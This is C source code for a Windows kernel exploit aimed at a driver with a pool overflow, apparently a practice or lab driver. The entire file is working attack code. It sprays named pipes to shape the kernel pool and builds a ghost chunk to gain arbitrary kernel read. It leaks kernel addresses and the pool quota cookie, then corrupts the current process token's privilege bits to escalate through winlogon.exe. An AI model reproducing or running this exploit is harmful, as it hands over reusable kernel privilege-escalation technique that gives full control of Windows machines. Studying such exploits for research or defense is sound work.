#include "../Banzi/banzi.h"

#define ADD		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DELE	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define EDIT	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define SHOW	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct request {
	DWORD64 size;
	POOL_TYPE poolType;
	void* buffer;
}request;

void add(DWORD64 size, POOL_TYPE pooType) {
	DWORD retLength = 0;
	DWORD64 address = 0;
	request req = { size, pooType, NULL };
	DeviceIoControl(hDevice, ADD, &req, sizeof(request), &address, 8, &retLength, NULL);
	info("[+] chunk address: %p", address);
}

void dele() {
	DWORD retLength = 0;
	request req = { 0, NonPagedPool, NULL };
	DeviceIoControl(hDevice, DELE, &req, sizeof(request), NULL, 0, &retLength, NULL);
}

void edit(DWORD64 size, void* buffer) {
	DWORD retLength = 0;
	request req = { size, NonPagedPool, buffer };
	DeviceIoControl(hDevice, EDIT, &req, sizeof(request), NULL, 0, &retLength, NULL);
}

char* fakeNpFr = NULL;
char* fakeIrp  = NULL;
HANDLE ghost_handle_r = INVALID_HANDLE_VALUE;
HANDLE ghost_handle_w = INVALID_HANDLE_VALUE;

void arb_read(DWORD64 addr, void* buffer, int len) {
	char* tmp = (char*)malloc(0x1d0 + len);
	memset(tmp, '\x00', 0x1d0 + len);
	*(DWORD64*)(fakeIrp + 0x18) = addr;
	peekPipe(ghost_handle_r, tmp, 0x210 - 0x40 + len);
	memcpy(buffer, tmp + 0x1d0, len);
	free(tmp);
}

int main() {
	char inBuffer[1024] = { 0 };
	char outBuffer[1024] = { 0 };
	DWORD retLenth = 0;
	
	init("\\\\.\\MyDeviceSymLink");
//	canSprayObjects();
//	getSomeKernelAddress();
	fakeNpFr = (char*)malloc(0x1000);
	memset(fakeNpFr, '\x00', 0x1000);
	fakeIrp = fakeNpFr + 0x200;

	PPIPE_HANDLES pHandles0  = initSprayNamedPipe(0x190, 0x200);
	PPIPE_HANDLES pHandles1  = initSprayNamedPipe(0x190, 0x100);
	PPIPE_HANDLES pHandles2  = initSprayNamedPipe(0x190, 0x200);
	PPIPE_HANDLES pHandles3  = initSprayNamedPipe(0x210, 0x2000);
	PPIPE_HANDLES pHandles4  = initSprayNamedPipe(0x210, 0x1000);
	PPIPE_HANDLES pHandles5  = initSprayNamedPipe(0x210, 0x200);
	PPIPE_HANDLES pHandles6  = initSprayNamedPipe(0x190, 0x1000);
	PPIPE_HANDLES pHandles7  = initSprayNamedPipe(0x190, 0x1000);
	PPIPE_HANDLES pHandles8  = initSprayNamedPipe(0x190, 0x1000);
	PPIPE_HANDLES pHandles9  = initSprayNamedPipe(0x190, 0x1000);
	PPIPE_HANDLES pHandles10 = initSprayNamedPipe(0x210, 0x1000);

	info("[+] Spray NpFr objects to construct pool layout");
	sprayNpFrByPipe(pHandles0, NULL);
	add(0x180, NonPagedPoolNx);
	sprayNpFrByPipe(pHandles1, NULL);
//	getchar();

	info("[+] Trigger pool overflow to rewrite next pool header");
	memset(inBuffer, 'A', sizeof(inBuffer));
	*(DWORD32*)(inBuffer + 0x180) = 0x07190015;
	edit(0x180 + 4, inBuffer);

	info("[+] Free the vuln pool chunk and reuse it by NpFr object");
	memset(inBuffer, 'B', sizeof(inBuffer));
	*(DWORD64*)(inBuffer + 0x00) = 0x7246704e02210000;
	*(DWORD64*)(inBuffer + 0x08) = 0x00;
	dele();
	sprayNpFrByPipe(pHandles2, inBuffer);
//	getchar();

	info("[+] Try to enable the Dynamic Lookaside for NonPagedPoolNx [0x220]");
	sprayNpFrByPipe(pHandles3, NULL);
	Sleep(2000);
	sprayNpFrByPipe(pHandles4, NULL);
	Sleep(1000);

	info("[+] Try to free NpFr objects adjacent to vuln pool chunk");
	closePipeHandles(pHandles0);
	closePipeHandles(pHandles1);
//	getchar();

	info("[+] Spray NpFr objects to get ghost pool chunk");
	memset(inBuffer, 'C', sizeof(inBuffer));
	for (int i = 0; i < pHandles5->nums; i++) {
		*(DWORD64*)inBuffer = 0xdead000 + i;
		WriteFile(pHandles5->handles[i].w, inBuffer, pHandles5->size - 0x40, &retLenth, 0);
	}

//	getchar();
	info("[+] Search ghost pool chunk pipe idx");
	DWORD64 vuln_idx = -1;
	DWORD64 ghost_idx = -1;
	DWORD64 ghost_ccb_addr = -1;
	for (int i = 0; i < pHandles2->nums; i++) {
		memset(outBuffer, '\x00', sizeof(outBuffer));
		peekPipe(pHandles2->handles[i].r, outBuffer, 0x50);
		ghost_idx = *(DWORD64*)(outBuffer + 0x40);
		DWORD64 val = *(DWORD64*)(outBuffer + 0x48);
		if ((ghost_idx&(~0xfff)) == 0x0dead000 && val == 0x4343434343434343) {
			vuln_idx = i;
			ghost_idx -= 0x0dead000;
			ghost_ccb_addr = *(DWORD64*)(outBuffer + 0x10) - 0xa8;
			ghost_handle_r = pHandles5->handles[ghost_idx].r;
			ghost_handle_w = pHandles5->handles[ghost_idx].w;
			break;
		}
		else {
			ghost_idx = -1;
		}
	}

	if (ghost_idx != -1) {
		info("[+] The vuln pipe index: %lld", vuln_idx);
		info("[+] The ghost pipe index: %lld", ghost_idx);;
		info("[+] The gohst ccb address: %#llx", ghost_ccb_addr);
	}
	else {
		err_exit("Failed to occupy ghost pool chunk");
	}
	

	info("[+] Free vuln chunk and reuse it to rewrite ghost NpFr chunk");
	memset(inBuffer, 'C', sizeof(inBuffer));
	*(DWORD64*)(fakeNpFr + 0x00) = ghost_ccb_addr + 0xa8;
	*(DWORD64*)(fakeNpFr + 0x08) = 0xdeadbeef;
	*(DWORD64*)(fakeNpFr + 0x10) = (DWORD64)fakeIrp;
	*(DWORD64*)(fakeNpFr + 0x18) = 0;
	*(DWORD64*)(fakeNpFr + 0x20) = 0x0000020000000001;
	*(DWORD64*)(fakeNpFr + 0x28) = 0x0000000000000200;

	*(DWORD64*)(inBuffer + 0x00) = 0x7246704e02210000;
	*(DWORD64*)(inBuffer + 0x08) = 0x28b931645818ffcb;
	*(DWORD64*)(inBuffer + 0x10) = (DWORD64)fakeNpFr;
	*(DWORD64*)(inBuffer + 0x18) = ghost_ccb_addr + 0xa8;
	*(DWORD64*)(inBuffer + 0x20) = 0;
	*(DWORD64*)(inBuffer + 0x28) = 0;
	*(DWORD64*)(inBuffer + 0x30) = 0x000001d000000000;
	*(DWORD64*)(inBuffer + 0x38) = 0x42424242000001d0;

	CloseHandle(pHandles2->handles[vuln_idx].r);
	CloseHandle(pHandles2->handles[vuln_idx].w);

	for (int i = 0; i < pHandles6->nums; i++) {
		*(DWORD64*)(inBuffer + 0x40) = 0xdead000000000000 + i;
		WriteFile(pHandles6->handles[i].w, inBuffer, pHandles6->size - 0x40, &retLenth, 0);
	}

	info("[+] Check Hit or not!!!");
	memset(outBuffer, '\x00', sizeof(outBuffer));
	peekPipe(ghost_handle_r, outBuffer, 0x10);
	{
		DWORD64 val0 = *(DWORD64*)(outBuffer + 0x00);
		DWORD64 val1 = *(DWORD64*)(outBuffer + 0x08);
		if ((val0&(~0xfff)) == 0xdead000000000000 && val1 == 0x4343434343434343) {
			vuln_idx = val0 - 0xdead000000000000;
			info("  [+] rewrite ghost chunk successfully");
		}
		else {
			info("  [-] failed to rewrite ghost chunk");
			exit(-1);
		}
	}

	info("[+] Leak some kernel addresses");
	DWORD64 ghost_chunk_addr = 0;
	DWORD64 file_object_addr = 0;
	DWORD64 device_object_addr = 0;
	DWORD64 driver_object_addr = 0;
	DWORD64 NpFsdCreate = 0;
	DWORD64 Npfs_base = 0;
	DWORD64 ntdll_base = 0;
	DWORD64 ExpPoolQuotaCookie = 0;

	arb_read(ghost_ccb_addr + 0xa8, (void*)&ghost_chunk_addr, 8);
	info("  [+] The ghost chunk address: %#llx", ghost_chunk_addr);

	arb_read(ghost_ccb_addr + 0x30, (void*)&file_object_addr, 8);
	arb_read(file_object_addr + 0x8, (void*)&device_object_addr, 8);

	if (device_object_addr == 0) {
		arb_read(ghost_ccb_addr + 0x38, (void*)&file_object_addr, 8);
		arb_read(file_object_addr + 0x8, (void*)&device_object_addr, 8);
	}
	arb_read(device_object_addr + 0x8, (void*)&driver_object_addr, 8);
	arb_read(driver_object_addr + 0x70, (void*)&NpFsdCreate, 8);
	Npfs_base = NpFsdCreate - 0xb540;
	info("  [+] Npfs base address: %#llx", Npfs_base);
	
	arb_read(Npfs_base + 0x7370, (void*)&ntdll_base, 8);
	ntdll_base -= 0x0025ac90;
	info("  [+] ntdll base address: %#llx", ntdll_base);

	arb_read(ntdll_base + 0x00cfc9e8, (void*)&ExpPoolQuotaCookie, 8);
	info("  [+] ExpPoolQuotaCookie: %#llx", ExpPoolQuotaCookie);

	arb_read(ntdll_base + 0x00cfc420, (void*)&kAddress.sysProc, 8);
	arb_read(kAddress.sysProc + 0x4b8, (void*)&kAddress.sysToken, 8);
	uint64_t curPid = GetCurrentProcessId();
	uint64_t searchAddr = kAddress.sysProc;
	uint64_t winlogon_Pid = 0;
	
	while (TRUE) {
		uint64_t searchPid = 0;
		arb_read(searchAddr + 0x440, (void*)&searchPid, 8);
		if (searchPid == curPid) {
			kAddress.curProc = searchAddr;
			arb_read(kAddress.curProc + 0x4b8, (void*)&kAddress.curToken, 8);
			kAddress.curToken &= ~0xf;
			break;
		}
		arb_read(searchAddr + 0x448, (void*)&searchAddr, 8);
		searchAddr -= 0x448;
	}

	searchAddr = kAddress.sysProc;
	while (TRUE) {
		memset(outBuffer, '\x00', sizeof(outBuffer));
		arb_read(searchAddr + 0x5a8, outBuffer, 15);
		if (!strcmp(outBuffer, "winlogon.exe")) {
			arb_read(searchAddr + 0x440, (void*)&winlogon_Pid, 8);
			break;
		}
		arb_read(searchAddr + 0x448, (void*)&searchAddr, 8);
		searchAddr -= 0x448;
	}

	info("  [+] Current process EPROCESS: %#llx", kAddress.curProc);
	info("  [+] Current process TOKEN: %#llx", kAddress.curToken);
	info("  [+] winlogon.exe process Pid: %#llx", winlogon_Pid);
	info("[+] Faking the EPROCESS to run Quota Attack");
	char* fakeEprocess0 = (char*)malloc(0x1000);
	char* fakeEprocess1 = (char*)malloc(0x1000);
	memset(fakeEprocess0, '\x00', 0x1000);
	memset(fakeEprocess1, '\x00', 0x1000);

	fakeEprocess0[0] = 0x60;
	fakeEprocess0[0x30] = 0x3;
	*(DWORD64*)(fakeEprocess0 + 0x30 + 0x568) = kAddress.curToken + 0x40 + 2;

	fakeEprocess1[0] = 0x60;
	fakeEprocess1[0x30] = 0x3;
	*(DWORD64*)(fakeEprocess1 + 0x30 + 0x568) = kAddress.curToken + 0x48;

	setPipeAttribute(ghost_handle_w, "Xiaoza1", fakeEprocess0, 0xb00);
	setPipeAttribute(ghost_handle_w, "Xiaoza2", fakeEprocess1, 0xb00);

	DWORD64 fakeEprocess0Addr = 0;
	DWORD64 fakeEprocess1Addr = 0;
	arb_read(ghost_ccb_addr + 0x150, (void*)&fakeEprocess0Addr, 8);
	arb_read(fakeEprocess0Addr, (void*)&fakeEprocess1Addr, 8);
	fakeEprocess0Addr += 0x30 + 0x30;
	fakeEprocess1Addr += 0x30 + 0x30;
	info("  [+] Fake Eprocess0 Address %#llx", fakeEprocess0Addr);
	info("  [+] Fake Eprocess1 Address %#llx", fakeEprocess1Addr);

	info("[+] Free vlun pool chunk and reuse it rewrite ghost pool chunk");
	memset(inBuffer, 'C', sizeof(outBuffer));
	*(DWORD64*)(inBuffer + 0x00) = 0x7246704e0a210000;
	*(DWORD64*)(inBuffer + 0x08) = (ghost_chunk_addr - 0x10) ^ ExpPoolQuotaCookie ^ fakeEprocess0Addr;
	*(DWORD64*)(inBuffer + 0x10) = ghost_ccb_addr + 0xa8;
	*(DWORD64*)(inBuffer + 0x18) = ghost_ccb_addr + 0xa8;
	*(DWORD64*)(inBuffer + 0x20) = 0;
	*(DWORD64*)(inBuffer + 0x28) = 0;
	*(DWORD64*)(inBuffer + 0x30) = 0x000001d000000000;
	*(DWORD64*)(inBuffer + 0x38) = 0x42424242000001d0;

	CloseHandle(pHandles6->handles[vuln_idx].r);
	CloseHandle(pHandles6->handles[vuln_idx].w);
	for (int i = 0; i < pHandles7->nums; i++) {
		*(DWORD64*)(inBuffer + 0x40) = 0xbead000000000000 + i;
		WriteFile(pHandles7->handles[i].w, inBuffer, pHandles7->size - 0x40, &retLenth, 0);
	}

	info("[+] Check Hit or not!!!");
	memset(outBuffer, '\x00', sizeof(outBuffer));
	peekPipe(ghost_handle_r, outBuffer, 0x10);
	{
		DWORD64 val0 = *(DWORD64*)(outBuffer + 0x00);
		DWORD64 val1 = *(DWORD64*)(outBuffer + 0x08);
		if ((val0&(~0xfff)) == 0xbead000000000000 && val1 == 0x4343434343434343) {
			vuln_idx = val0 - 0xbead000000000000;
			info("  [+] rewrite ghost chunk successfully");
		}
		else {
			info("  [-] failed to rewrite ghost chunk");
			exit(-1);
		}
	}

	info("[+] Free ghost pool chunk to trigger Quota Attack to dec _TOKEN.Privileges.Present");
	Sleep(500);
	readPipe(ghost_handle_r, inBuffer, 0x1d0);
	WriteFile(ghost_handle_w, inBuffer, 0x1d0, &retLenth, 0);

	info("[+] Free vlun pool chunk and reuse it rewrite ghost pool chunk");
	memset(inBuffer, 'C', sizeof(outBuffer));
	*(DWORD64*)(inBuffer + 0x00) = 0x7246704e0a210000;
	*(DWORD64*)(inBuffer + 0x08) = (ghost_chunk_addr - 0x10) ^ ExpPoolQuotaCookie ^ fakeEprocess1Addr;
	*(DWORD64*)(inBuffer + 0x10) = ghost_ccb_addr + 0xa8;
	*(DWORD64*)(inBuffer + 0x18) = ghost_ccb_addr + 0xa8;
	*(DWORD64*)(inBuffer + 0x20) = 0;
	*(DWORD64*)(inBuffer + 0x28) = 0;
	*(DWORD64*)(inBuffer + 0x30) = 0x000001d000000000;
	*(DWORD64*)(inBuffer + 0x38) = 0x42424242000001d0;

	CloseHandle(pHandles7->handles[vuln_idx].r);
	CloseHandle(pHandles7->handles[vuln_idx].w);
	for (int i = 0; i < pHandles8->nums; i++) {
		*(DWORD64*)(inBuffer + 0x40) = 0xbddb000000000000 + i;
		WriteFile(pHandles8->handles[i].w, inBuffer, pHandles8->size - 0x40, &retLenth, 0);
	}
	info("[+] Check Hit or not!!!");
	memset(outBuffer, '\x00', sizeof(outBuffer));
	peekPipe(ghost_handle_r, outBuffer, 0x10);
	{
		DWORD64 val0 = *(DWORD64*)(outBuffer + 0x00);
		DWORD64 val1 = *(DWORD64*)(outBuffer + 0x08);
		if ((val0&(~0xfff)) == 0xbddb000000000000 && val1 == 0x4343434343434343) {
			vuln_idx = val0 - 0xbddb000000000000;
			info("  [+] rewrite ghost chunk successfully");
		}
		else {
			info("  [-] failed to rewrite ghost chunk");
			exit(-1);
		}
	}

	info("[+] Free ghost pool chunk to trigger Quota Attack to dec _TOKEN.Privileges.Enabled");
	Sleep(500);
	readPipe(ghost_handle_r, inBuffer, 0x1d0);
	WriteFile(ghost_handle_w, inBuffer, 0x1d0, &retLenth, 0);
	Sleep(500);


	sprayNpFrByPipe(pHandles9, NULL);
	sprayNpFrByPipe(pHandles10, NULL);
	Sleep(1000);

	escalateBySeDebugPrivilege(winlogon_Pid);

//	system("cmd.exe");
	getchar();
	return 0;
}
